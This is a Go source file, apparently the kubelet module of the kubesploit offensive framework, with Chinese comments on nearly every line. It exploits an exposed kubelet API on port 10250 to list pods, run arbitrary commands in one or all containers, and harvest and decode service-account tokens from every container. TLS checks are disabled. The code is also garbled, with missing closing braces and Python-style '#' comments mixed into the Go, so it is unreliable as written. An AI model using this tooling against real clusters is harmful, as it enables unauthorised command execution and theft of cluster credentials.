# `kubesploit\data\modules\sourcecode\go\kubelet\main.go`

```
package main

import (
    "bytes"  // 导入 bytes 包，用于操作字节
    "crypto/tls"  // 导入 crypto/tls 包，用于加密通信
    b64 "encoding/base64"  // 导入 encoding/base64 包，并起别名为 b64，用于 base64 编码
    "encoding/json"  // 导入 encoding/json 包，用于 JSON 编解码
    "errors"  // 导入 errors 包，用于错误处理
    "fmt"  // 导入 fmt 包，用于格式化输入输出
    "io/ioutil"  // 导入 io/ioutil 包，用于读取文件内容
    "log"  // 导入 log 包，用于日志记录
    "net/http"  // 导入 net/http 包，用于 HTTP 请求
    "os"  // 导入 os 包，用于操作系统功能
    "strings"  // 导入 strings 包，用于字符串操作
    "time"  // 导入 time 包，用于时间操作
)

// 定义 MetaData 结构体，包含 Name 和 Namespace 两个字段
type MetaData struct {
    Name      string `json:"name"`  // 使用 json 标签指定 JSON 编码时的字段名
    Namespace string `json:"namespace"`  // 使用 json 标签指定 JSON 编码时的字段名
}

// 定义 Container 结构体，包含 Name、RCEExec 和 RCERun 三个字段
type Container struct {
    Name    string `json:"name"`  // 使用 json 标签指定 JSON 编码时的字段名
    RCEExec bool  // RCEExec 字段，表示是否支持远程命令执行
    RCERun  bool  // RCERun 字段，表示是否支持远程命令运行
}

// 定义 Spec 结构体，包含 Containers 字段，表示容器列表
type Spec struct {
    Containers []Container `json:"containers"`  // 使用 json 标签指定 JSON 编码时的字段名
}

// 定义 Pod 结构体，包含 MetaData 和 Spec 两个字段
type Pod struct {
    MetaData MetaData `json:"metadata"`  // 使用 json 标签指定 JSON 编码时的字段名
    Spec     Spec     `json:"spec"`  // 使用 json 标签指定 JSON 编码时的字段名
}

// 定义 PodList 结构体，包含 Items 字段，表示 Pod 列表
type PodList struct {
    Items []Pod `json:"items"`  // 使用 json 标签指定 JSON 编码时的字段名
}

var GlobalClient *http.Client  // 定义全局变量 GlobalClient，表示 HTTP 客户端

// 初始化 HTTP 客户端
func InitHttpClient() {
    tr := &http.Transport{  // 创建 HTTP 传输对象
        MaxIdleConns:       10,  // 设置最大空闲连接数
        IdleConnTimeout:    30 * time.Second,  // 设置空闲连接超时时间
        DisableCompression: true,  // 禁用压缩
        TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},  // 配置 TLS 客户端
    }

    GlobalClient = &http.Client{  // 创建 HTTP 客户端
        Transport: tr,  // 设置传输对象
        Timeout:   time.Second * 20,  // 设置超时时间
    }
}

// 发送 HTTP 请求获取 Pod 列表
func getPods(url string) PodList {
    apiUrl := url + PODS_API  // 拼接 API 地址
    resp, err := GetRequest(GlobalClient, apiUrl)  // 发送 HTTP 请求获取响应
    if err != nil {
        fmt.Printf("[*] Failed to run HTTP request with error: %s\n", err)  // 打印错误信息
        os.Exit(1)  // 退出程序
    }

    bodyBytes, err := ioutil.ReadAll(resp.Body)  // 读取响应体内容
    if err != nil {
        log.Fatal(err)  // 记录错误日志并退出程序
    }

    var podList PodList  // 声明 PodList 变量
    err = json.Unmarshal(bodyBytes, &podList)  // 解析 JSON 数据到 PodList 变量

    return podList  // 返回 PodList 变量
}

// 发送 HTTP 请求获取原始 Pod 数据
func getRawPods(url string) []byte {
    apiUrl := url + PODS_API  // 拼接 API 地址
    resp, err := GetRequest(GlobalClient, apiUrl)  // 发送 HTTP 请求获取响应
    if err != nil {
        fmt.Printf("[*] Failed to run HTTP request with error: %s\n", err)  // 打印错误信息
        os.Exit(1)  // 退出程序
    }

    bodyBytes, err := ioutil.ReadAll(resp.Body)  // 读取响应体内容
    if err != nil {
        log.Fatal(err)  // 记录错误日志并退出程序
    }

    return bodyBytes  // 返回响应体内容
}

const (
    PODS_API string = "/pods"  // 定义 PODS_API 常量，表示 Pod API 地址
    RUN_API  string = "/run"  // 定义 RUN_API 常量，表示运行 API 地址
    EXEC_API string = "/exec"  // 定义 EXEC_API 常量，表示执行 API 地址
)

// 发送 HTTP GET 请求
func GetRequest(client *http.Client, url string) (*http.Response, error) {
    // 创建一个新的 HTTP 请求，使用 GET 方法，请求的 URL 为给定的 URL，请求体为空
    req, _ := http.NewRequest("GET", url, nil)

    // 设置请求头中的 Authorization 字段，值为 "Bearer " + BEARER_TOKEN
    // req.Header.Set("Authorization", "Bearer " + BEARER_TOKEN)

    // 使用给定的客户端执行 HTTP 请求，将结果和可能的错误返回
    resp, err := (*client).Do(req)
    // 返回 HTTP 响应和可能的错误
    return resp, err
// 定义一个名为 PostRequest 的函数，用于发送 HTTP POST 请求
func PostRequest(client *http.Client, url string, bodyData []byte) (*http.Response, error) {
    // 创建一个 HTTP POST 请求
    req, _ := http.NewRequest("POST", url, bytes.NewBuffer(bodyData))
    // 设置请求头的 Content-Type
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    // 发送 HTTP 请求并获取响应
    resp, err := (*client).Do(req)
    return resp, err
}

// 定义一个名为 printPods 的函数，用于打印 Pod 列表
func printPods(podList []Pod) {
    count := 1
    baseSubIndexAlpha := 97 // base 'a'
    // 遍历 Pod 列表
    for _, pod := range podList {
        // 打印 Pod 的名称和命名空间
        fmt.Printf("%d. Pod: %s \n   Namespace: %s\n   Containers:\n", count, pod.MetaData.Name, pod.MetaData.Namespace)
        count += 1
        count2 := 0
        containers := pod.Spec.Containers
        // 遍历 Pod 中的容器列表
        for _, container := range containers {
            // 如果容器的 RCERun 属性为 true，则打印带有 RCE 启用标记的容器信息
            if container.RCERun {
                fmt.Printf("      %s. Container: %s (\u001B[1;34mRCE enabled\u001B[0m)\n", string(count2+baseSubIndexAlpha), container.Name)
            } else {
                // 否则，打印容器的名称
                fmt.Printf("      %s. Container: %s\n", string(count2+baseSubIndexAlpha), container.Name)
            }
            count2 += 1
        }
    }
}

// 定义一个名为 checkPodsForRCE 的函数，用于检查 Pod 是否启用了 RCE
func checkPodsForRCE(nodeUrl string, pods []Pod) []Pod {
    // 定义一个命令
    command := "cmd=ls /"
    var nodePods []Pod
    # 遍历 pods 数组中的每个元素
    for _, pod := range pods {
        # 初始化一个空的容器数组
        var podContainers []Container
        # 获取当前 pod 的所有容器
        containers := pod.Spec.Containers
        # 遍历当前 pod 的所有容器
        for _, container := range containers {
            # 初始化容器是否运行的标志为 false
            containerRCERun := false
            # 构建 API 调用的路径
            apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", nodeUrl, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name)
            # 发起 POST 请求，执行命令
            resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))

            # TODO: check if this check is enough
            # 检查错误和响应状态码，判断容器是否成功运行
            if err == nil && resp != nil && resp.StatusCode == http.StatusOK {
                containerRCERun = true
            }
            # 将容器的名称和运行状态添加到容器数组中
            podContainers = append(podContainers, Container {
                Name:    container.Name,
                RCERun:  containerRCERun,
            })
        }

        # 将当前 pod 的元数据和容器数组添加到节点的 pod 数组中
        nodePods = append(nodePods, Pod{
            MetaData:       MetaData{
                Name:      pod.MetaData.Name,
                Namespace: pod.MetaData.Namespace,
            },
            Spec: Spec{
                Containers: podContainers,
            },
        })
    }

    # 返回节点的 pod 数组
    return nodePods
// 全局变量，用于存储协议模式
var globalProtocolSchema string
// 全局变量，用于存储节点 IP 地址
var globalNodeIP string
// 全局变量，用于存储 Kubelet 端口号
var globalKubeletPort string

// 解析节点 URL，将协议模式、节点 IP 地址和 Kubelet 端口号存储到全局变量中
func parseNodeURl(url string){
    // 使用冒号分割 URL 字符串
    splitted := strings.Split(url, ":")
    // 将协议模式存储到全局变量中
    globalProtocolSchema = splitted[0]
    // 从节点 IP 地址中移除斜杠，并存储到全局变量中
    globalNodeIP = strings.Replace(splitted[1], "/", "", 2)
    // 将 Kubelet 端口号存储到全局变量中
    globalKubeletPort = splitted[2]
}

// 查找并打印存在 RCE 漏洞的容器
func findAndPrintContainerWithRCE(url string){
    // 获取节点上的 Pod 列表
    podList := getPods(url)
    // 检查 Pod 是否存在 RCE 漏洞
    containersWithRCE := checkPodsForRCE(url, podList.Items)
    // 打印存在 RCE 漏洞的 Pod 列表
    printPods(containersWithRCE)
}

// 查找并打印所有的 Pod
func findAndPrintPods(url string){
    // 获取节点上的 Pod 列表
    podList := getPods(url)
    // 打印所有的 Pod 列表
    printPods(podList.Items)
}

// 解析命令行参数
// 参考：https://stackoverflow.com/a/46973603
func parseCommandLine(command string) ([]string, error) {
    var args []string
    state := "start"
    current := ""
    quote := "\""
    escapeNext := true
    for i := 0; i < len(command); i++ {
        c := command[i]

        if state == "quotes" {
            if string(c) != quote {
                current += string(c)
            } else {
                args = append(args, current)
                current = ""
                state = "start"
            }
            continue
        }

        if (escapeNext) {
            current += string(c)
            escapeNext = false
            continue
        }

        if (c == '\\') {
            escapeNext = true
            continue
        }

        if c == '"' || c == '\'' {
            state = "quotes"
            quote = string(c)
            continue
        }

        if state == "arg" {
            if c == ' ' || c == '\t' {
                args = append(args, current)
                current = ""
                state = "start"
            } else {
                current += string(c)
            }
            continue
        }

        if c != ' ' && c != '\t' {
            state = "arg"
            current += string(c)
        }
    }

    // 检查是否存在未闭合的引号
    if state == "quotes" {
        return []string{}, errors.New(fmt.Sprintf("Unclosed quote in command line: %s", command))
    }
    # 如果当前字符串不为空
    if current != "" {
        # 将当前字符串添加到参数列表中
        args = append(args, current)
    }
    # 返回参数列表和空错误
    return args, nil
// 定义常量，用于标识不同的操作类型
const (
    GET_PODS = "pods"
    GET_CONTAINERS_RCE = "rce"
    RUN_COMMAND = "run"
    TOKEN_COMMAND = "token"
)

// 打印 HTTP 响应的函数
func printHttpResponse(resp *http.Response, err error) {
    // 如果响应不为空
    if resp != nil {
        // 读取响应体的内容
        bodyBytes, err := ioutil.ReadAll(resp.Body)
        // 如果读取出错，记录错误并退出程序
        if err != nil {
            log.Fatal(err)
        }
        // 将响应体内容转换为字符串
        bodyString := string(bodyBytes)
        // 如果响应状态码为 200
        if resp.StatusCode == http.StatusOK {
            // 打印响应体内容
            fmt.Println(bodyString)
        } else {
            // 打印响应状态码和消息体内容
            fmt.Printf("[*] The reponse failed with status: %d\n", resp.StatusCode)
            fmt.Printf("[*] Message: %s\n", bodyString)
        }
    } else {
        // 如果响应为空，打印提示信息
        fmt.Println("[*] Response is empty")
        // 如果有错误，记录错误并退出程序
        if err != nil {
            log.Fatal(err)
        }
    }
}

// 在容器上运行命令的函数
func runCommandOnContainer(url string, runCommand string, podName string, containerName string, namespace string) {
    // 如果未设置运行命令，设置默认命令为 'ls /'
    if runCommand == "" {
        fmt.Println("[*] No command was set, setting default command 'ls /'")
        runCommand = "ls /"
    }
    // 构造命令字符串
    command := "cmd=" + runCommand
    // 构造 API 路径
    apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", url, RUN_API, namespace, podName, containerName)
    // 发送 POST 请求，并获取响应
    resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))
    // 处理响应
    printHttpResponse(resp, err)
}

// 考虑将其改为异步执行
func runCommandOnAllContainers(url string, runCommand string){
    // 如果未设置运行命令，设置默认命令为 'ls /'
    if runCommand == "" {
        fmt.Println("[*] No command was set, setting default command 'ls /'")
        runCommand = "ls /"
    }
    // 构造命令字符串
    command := "cmd=" + runCommand
    // 获取所有 Pod 列表
    podList := getPods(url)
    // 初始化 Pod 数量
    podNumber := 0
    // 初始化空格字符串
    spacesString := "   "
    // 遍历 podList 中的每个 pod 对象
    for _, pod := range podList.Items {
        // 增加 podNumber 计数
        podNumber += 1

        // 遍历每个 pod 中的容器对象
        for _, container := range pod.Spec.Containers {
            // 如果 podNumber 大于 9，则需要添加更多空格以使行变直
            if podNumber > 9 {
                spacesString = "    "
            } else if podNumber > 99 {
                spacesString = "     "
            }

            // 构建 API 路径的 URL
            apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", url, RUN_API,pod.MetaData.Namespace, pod.MetaData.Name, container.Name)
            // 发送 POST 请求，获取响应
            resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))
            var output string
            // 如果没有错误并且有响应
            if err == nil && resp != nil {
                // 读取响应体内容
                bodyBytes, err := ioutil.ReadAll(resp.Body)
                if err == nil {
                    output = string(bodyBytes)
                }
            }

            // 构建输出字符串
            var sb strings.Builder
            sb.WriteString(fmt.Sprintf("%d. Pod: %s\n", podNumber, pod.MetaData.Name))
            sb.WriteString(fmt.Sprintf("%sNamespace: %s\n", spacesString, pod.MetaData.Namespace))
            sb.WriteString(fmt.Sprintf("%sContainer: %s\n", spacesString, container.Name))
            sb.WriteString(fmt.Sprintf("%sUrl: %s\n", spacesString, apiPathUrl))
            sb.WriteString(fmt.Sprintf("%sOutput: \n%s\n\n", spacesString, output))
            // 打印输出字符串
            fmt.Println(sb.String())
        }
    }
// 定义一个结构体类型 RunOutput，包含了执行命令的输出信息
type RunOutput struct {
    Url           string
    PodName       string
    ContainerName string
    Namespace     string
    Output        string
    StatusCode    int
}

// 定义一个函数 runParallelCommandsOnPods，用于并行在多个 Pod 上执行命令
func runParallelCommandsOnPods(url string, runCommand string) {
    // 如果未设置执行命令，则使用默认命令 'ls /'
    if runCommand == "" {
        fmt.Println("[*] No command was set, setting default command 'ls /'")
        runCommand = "ls /"
    }
    // 构建命令字符串
    command := "cmd=" + runCommand

    // 获取 Pod 列表
    podList := getPods(url)
    // 并发限制为 5
    concurrencyLimit := 5
    // 创建一个带缓冲的通道，用于限制并发数量
    semaphoreChan := make(chan struct{}, concurrencyLimit)

    // 创建一个不带缓冲的通道，用于收集 HTTP 请求的结果
    resultsChan := make(chan *RunOutput)

    // 确保在使用完通道后关闭它们
    defer func() {
        close(semaphoreChan)
        close(resultsChan)
    }()

    // 容器计数器
    containersCounter := 0
    // 保持索引并循环遍历每个 URL，我们将向其发送请求
    // 遍历 podList.Items 数组，获取索引和对应的 pod 对象
    for i, pod := range podList.Items {
        // 遍历 pod 对象的容器数组
        for _, container := range pod.Spec.Containers {

            // 在闭包中使用索引和 Url 启动一个 Go 协程
            go func(i int, pod Pod, container Container) {

                // 向 semaphoreChan 发送一个空结构体，表示将限制值加一，当达到限制时阻塞，直到有空间
                semaphoreChan <- struct{}{}

                // 构建 API 路径
                apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", url, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name)
                // 发送 POST 请求
                resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))
                statusCode := 0
                var output string
                // 处理响应结果
                if err == nil && resp != nil {
                    statusCode = resp.StatusCode
                    bodyBytes, err := ioutil.ReadAll(resp.Body)
                    if err == nil {
                        output = string(bodyBytes)
                    }
                }

                // 构建 RunOutput 结构体
                result := &RunOutput{apiPathUrl, pod.MetaData.Name, container.Name, pod.MetaData.Namespace,output, statusCode}
                containersCounter += 1
                // 将结果发送到 resultsChan
                resultsChan <- result
                // 从 semaphoreChan 中读取，将限制值减一，允许另一个 Go 协程启动
                <-semaphoreChan
            }(i, pod, container)
        }
    }

    // 开始监听 resultsChan 中的任何结果
    // 一旦收到结果，将其追加到 Result 切片中
    podNumber := 1
    spacesString := "   "
    for {
        result := <-resultsChan  // 从结果通道中接收结果

        // 如果 podNumber 大于 9，则需要添加更多空格来使行变直
        if podNumber > 9 {
            spacesString = "    "
        } else if podNumber > 99 {
            spacesString = "     "
        }

        var sb strings.Builder  // 创建一个字符串构建器
        sb.WriteString(fmt.Sprintf("%d. Pod: %s\n", podNumber, result.PodName))  // 将格式化的字符串添加到字符串构建器中
        sb.WriteString(fmt.Sprintf("%sNamespace: %s\n", spacesString, result.Namespace))  // 将格式化的字符串添加到字符串构建器中
        sb.WriteString(fmt.Sprintf("%sContainer: %s\n", spacesString, result.ContainerName))  // 将格式化的字符串添加到字符串构建器中
        sb.WriteString(fmt.Sprintf("%sUrl: %s\n", spacesString, result.Url))  // 将格式化的字符串添加到字符串构建器中
        sb.WriteString(fmt.Sprintf("%sOutput: \n%s\n\n", spacesString, result.Output))  // 将格式化的字符串添加到字符串构建器中
        fmt.Println(sb.String())  // 打印字符串构建器中的内容

        podNumber += 1  // 增加 podNumber 的值

        // 如果已经达到预期的 runPodsInfo 数量，则停止循环
        if podNumber == containersCounter {
            break
        }
    }
// 从所有的 Pod 中扫描令牌
func scanForTokensFromAllPods(url string) {
    // 定义要执行的命令
    command := "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

    // 获取所有 Pod 的列表
    podList := getPods(url)
    // 设置并发限制
    concurrencyLimit := 5

    // 创建一个带缓冲的通道，用于限制并发数量
    semaphoreChan := make(chan struct{}, concurrencyLimit)

    // 创建一个不带缓冲的通道，用于收集 HTTP 请求的结果
    resultsChan := make(chan *RunOutput)

    // 确保在使用完毕后关闭这些通道
    defer func() {
        close(semaphoreChan)
        close(resultsChan)
    }()

    // 容器计数器
    containersCounter := 0
    // 保持索引并循环遍历我们将发送请求的每个 URL
    // 遍历 podList 中的每个 pod 对象
    for i, pod := range podList.Items {
        // 遍历当前 pod 对象中的每个容器对象
        for _, container := range pod.Spec.Containers {

            // 在闭包中使用索引和 Url 启动一个 Go 协程
            go func(i int, pod Pod, container Container) {

                // 将一个空结构体发送到 semaphoreChan 中，这基本上是在说将限制加一，但当达到限制时，阻塞直到有空间
                semaphoreChan <- struct{}{}

                // 构建 API 路径 Url
                apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", url, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name)
                // 发送 POST 请求，获取响应和可能的错误
                resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))
                statusCode := 0
                var output string
                // 如果没有错误并且响应不为空
                if err == nil && resp != nil {
                    statusCode = resp.StatusCode
                    // 读取响应体数据
                    bodyBytes, err := ioutil.ReadAll(resp.Body)
                    if err == nil {
                        output = string(bodyBytes)
                    }
                }

                // 构建 RunOutput 结构体
                result := &RunOutput{apiPathUrl, pod.MetaData.Name, container.Name, pod.MetaData.Namespace,output, statusCode}
                // 容器计数器加一
                containersCounter += 1
                // 现在可以将 Result 结构体通过 resultsChan 发送出去
                resultsChan <- result
                // 一旦完成，从 semaphoreChan 中读取，这会将限制减一，允许另一个 Go 协程启动
                <-semaphoreChan
            }(i, pod, container)
        }
    }

    // 开始监听 resultsChan 上的任何结果
    // 一旦收到一个 Result，将其追加到 Result 切片中
    var count int
    podNumber := 1
    spacesString := "   "
    // 无限循环，从结果通道中接收结果
    for {
        result := <-resultsChan
        // 计数加一
        count += 1
        // 休眠500毫秒
        time.Sleep(time.Millisecond * 500)
        // 如果计数大于9，需要添加更多空格以使行变直
        if count > 9 {
            spacesString = "    "
        } else if count > 99 {
            spacesString = "     "
        }

        // 创建字符串构建器
        var sb strings.Builder
        // 将格式化的字符串添加到字符串构建器中
        sb.WriteString(fmt.Sprintf("%d. Pod: %s\n", podNumber, result.PodName))
        sb.WriteString(fmt.Sprintf("%sNamespace: %s\n", spacesString, result.Namespace))
        sb.WriteString(fmt.Sprintf("%sContainer: %s\n", spacesString, result.ContainerName))
        sb.WriteString(fmt.Sprintf("%sUrl: %s\n", spacesString, result.Url))
        sb.WriteString(fmt.Sprintf("%sOutput: \n%s\n\n", spacesString, result.Output))
        // 打印字符串构建器中的内容
        fmt.Println(sb.String())

        // 如果结果状态码为200
        if result.StatusCode == http.StatusOK {
            // 打印解码后的令牌
            PrintDecodedToken(result.Output)
        }

        // Pod编号加一
        podNumber += 1

        // 如果已经达到预期的runPodsInfo数量，则停止循环
        if (podNumber - 1) == containersCounter {
            break
        }
    }

    // 休眠1秒
    time.Sleep(time.Second)
}

// 定义JWTToken结构体，包含JWT token中的各个字段
type JWTToken struct{
    Iss            string `json:"iss"`
    Namespace      string `json:"kubernetes.io/serviceaccount/namespace"`
    Secret         string `json:"kubernetes.io/serviceaccount/secret.name"`
    ServiceAccount string `json:"kubernetes.io/serviceaccount/service-account.name"`
    Uid            string `json:"kubernetes.io/serviceaccount/service-account.uid"`
    Sub            string `json:"sub"`
}

// 从kubetok中获取解码后的token并打印出来
func PrintDecodedToken(tokenString string) {
    // 将token字符串按照"."分割
    splittedToken := strings.Split(tokenString, ".")
    // 对第二部分进行base64解码
    sDec, _  := b64.StdEncoding.DecodeString(splittedToken[1])
    newDec:= string(sDec)
    // 替换换行符
    newDec = strings.Replace(newDec, "\r\n", "\n", -1)
    // 如果解码后的字符串不以"}"结尾，则添加"}"
    if !strings.HasSuffix(newDec, "}"){
        newDec += "}"
    }

    // 创建JWTToken对象
    var jwtToken JWTToken
    // 将解码后的字符串解析为JWTToken对象
    err := json.Unmarshal([]byte(newDec), &jwtToken)
    if err != nil {
        fmt.Printf("[*] Failed to print %s", err)
    } else {
        // 创建字符串构建器
        var sb strings.Builder
        // 构建打印输出
        sb.WriteString(fmt.Sprintln("---------------"))
        sb.WriteString(fmt.Sprintln("|Decoded Token|"))
        sb.WriteString(fmt.Sprintln("---------------"))
        sb.WriteString(fmt.Sprintf(" iss: %s\n", jwtToken.Iss))
        sb.WriteString(fmt.Sprintf(" Namespace: %s\n", jwtToken.Namespace))
        sb.WriteString(fmt.Sprintf(" Secret name: %s\n", jwtToken.Secret))
        sb.WriteString(fmt.Sprintf(" ServiceAccount: %s\n", jwtToken.ServiceAccount))
        sb.WriteString(fmt.Sprintf(" uid: %s\n", jwtToken.Uid))
        sb.WriteString(fmt.Sprintf(" sub: %s\n", jwtToken.Sub))
        sb.WriteString(fmt.Sprintf(" Raw: \n%s\n\n", newDec))
        // 打印输出
        fmt.Println(sb.String())
    }
}

// 主函数，接收URL和命令行参数，执行相应操作
func mainfunc(url string, commandLine string) error {
    // 去除命令行参数和URL的前后空格
    commandLine = strings.TrimSpace(commandLine)
    url = strings.TrimSpace(url)
    // 解析命令行参数
    args, err := parseCommandLine(commandLine)

    if err != nil {
        return err
    }

    // 初始化容器标志和Pod标志
    containerFlag := false
    podFlag := false
    // 标志位，表示是否指定了 namespace
    namespaceFlag := false
    // 标志位，表示是否等待运行命令
    waitForRunCommand := false
    // 标志位，表示是否获取所有的 pods
    allPodsFlag := false
    // 标志位，表示是否异步获取所有的 pods
    allPodsAsyncFlag := false
    // 标志位，表示是否原始输出
    rawFlag := false
    // 定义容器名称变量
    var containerName string
    // 定义 pod 名称变量
    var podName string
    // 定义 namespace 变量
    var namespace string
    // 定义命令变量
    var command string
    // 定义运行命令变量
    var runCommand string

    // 遍历参数列表
    for i:= 0; i < len(args); i++ {
        // 判断是否以 "-c" 开头
        if strings.HasPrefix(args[i], "-c") {
            containerFlag = true
            continue
        } else if strings.HasPrefix(args[i], "-p") {
            podFlag = true
            continue
        } else if strings.HasPrefix(args[i], "-n") {
            namespaceFlag = true
            continue
        } else if strings.HasPrefix(args[i], "-a") {
            allPodsFlag = true
            continue
        } else if strings.HasPrefix(args[i], "-as") {
            allPodsAsyncFlag = true
            continue
        } else if strings.HasPrefix(args[i], "-r") {
            rawFlag = true
            continue
        } else {
            // 判断是否指定了容器名称
            if containerFlag {
                containerName = args[i]
                containerFlag = false
            } else if podFlag {
                // 判断是否指定了 pod 名称
                podName = args[i]
                podFlag = false
            } else if namespaceFlag {
                // 判断是否指定了 namespace
                namespace = args[i]
                namespaceFlag = false
            }  else { // 没有指定开关
                // 如果正在等待运行命令，则获取运行命令
                if waitForRunCommand {
                    runCommand = args[i]
                    waitForRunCommand = false
                } else {
                    // 否则获取普通命令
                    command = args[i]
                    // 如果命令是 RUN_COMMAND，则等待运行命令
                    if command == RUN_COMMAND {
                        waitForRunCommand = true
                    }
                }
            }
        }
    }

    // 初始化 HTTP 客户端
    InitHttpClient()

    // 将命令转换为小写
    command = strings.ToLower(command)
    // 根据命令执行相应的操作
    switch command {
    case GET_CONTAINERS_RCE:
        findAndPrintContainerWithRCE(url)
    # 根据命令类型执行相应的操作
    case RUN_COMMAND:
        # 如果命名空间为空，则设置默认命名空间为"default"
        if namespace == "" {
            namespace = "default"
        }

        # 如果 allPodsFlag 为真，则同步在所有 pod 上运行命令
        if allPodsFlag {
            fmt.Printf("[*] Run the command \"%s\" on all pods synchronously\n", runCommand)
            runCommandOnAllContainers(url, runCommand)
        } 
        # 如果 allPodsAsyncFlag 为真，则异步在所有 pod 上运行命令
        else if allPodsAsyncFlag {
            fmt.Printf("[*] Run the command \"%s\" on all pods asynchronously\n", runCommand)
            runParallelCommandsOnPods(url, runCommand)
        } 
        # 否则在指定的 pod、容器和命名空间上运行命令
        else {
            fmt.Printf("[*] Run the command \"%s\" on pod: %s, container: %s, namespace: %s\n", runCommand)
            runCommandOnContainer(url, runCommand, podName, containerName, namespace)
        }
    # 如果命令类型为 TOKEN_COMMAND，则扫描所有 pod 获取 token
    case TOKEN_COMMAND:
        scanForTokensFromAllPods(url)
    # 如果命令类型为其他，则根据标志位执行相应操作
    default:
        # 如果 rawFlag 为真，则获取原始 pod 数据并打印
        if rawFlag {
            raw := getRawPods(url)
            fmt.Println(string(raw))
        }
        # 否则查找并打印 pod 数据
        else {
            findAndPrintPods(url)
        }
    }

    # 返回可能存在的错误
    return err
// 主函数入口
func main(){
    // 调用 mainfunc 函数，传入参数 "https://<node_ip>:10250", "run -a"
    mainfunc("https://<node_ip>:10250", "run -a")
}
```